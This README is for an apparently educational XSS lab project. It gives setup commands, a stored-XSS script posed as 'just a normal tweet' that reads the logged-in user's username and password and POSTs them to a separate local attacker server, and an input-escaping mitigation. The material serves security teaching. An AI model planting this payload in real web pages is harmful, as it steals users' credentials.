# XSS example for Security 2

Extremely simple example of an XSS attack. This case is used to see security analysis and protocols working in practice. 

### Installing and Running

Install with npm
```
npm install
```

Start two servers: the server hosting the page and a malicious server.
```
node server/server.js
node attacker/eve.js
json-server --watch db.json --port 3004

// Begin Tweet

Just a normal tweet not an secret script or something
<script>
    $.get('http://localhost:3004/users', function (data, status) {
        for (var i = 0; i < data.length; i++) {
            var obj = data[i];
            if (obj.userName === localStorage.getItem("User")) {
                const data2 = `Username=${obj.userName} - Password=${obj.password}`;
                $.ajax({
                    url: 'http://localhost:3007',
                    method: 'POST',
                    type: 'jsonp',
                    data: data2
                })
            }
        }
    })
</script>

// End Tweet

Mitigation = Validation on the tweet message by adding this to the post in index.html

const message = $('#tweet').val();
const edited = message.replace(/&/g, "&amp;").replace(/>/g, "&gt;").replace(/</g, "&lt;").replace(/"/g, "&quot;");
const data = {
                tweet: edited,
                author: localStorage.getItem('User')
            }


